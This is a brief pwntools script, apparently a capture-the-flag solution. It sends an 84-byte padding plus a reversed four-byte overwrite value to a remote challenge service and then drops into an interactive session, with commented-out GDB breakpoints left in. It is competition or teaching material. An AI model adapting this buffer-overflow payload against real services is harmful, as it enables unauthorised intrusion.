from pwn import *


def send_exploit(sh, exploit):
    sh.sendline(exploit)
    sh.interactive()

print "[+ process started]"
#sh = process("/root/Desktop/ctf/sunshine/dance_noflag")
#sh = process("/bin/sh")
#sh.sendline("gdb /root/Desktop/ctf/sunshine/dance_noflag")
sh = remote("4.31.182.242", 9001)
sh.recv()
#breaks GDB
#sh.sendline("b *0x8048638") #0x8048633 fgets
#sh.sendline("b *0x0804877f") #compare 1337
#sh.sendline("r")
exploit = 21*4*"A"
reverse_me = "\x12\xad\xaa\xc9"
exploit += reverse_me[::-1]
#sh.sendline("b *0x004749d8")
#print sh.recv(timeout=1)
#sh.sendline("r")
send_exploit(sh, exploit)
sh.close()
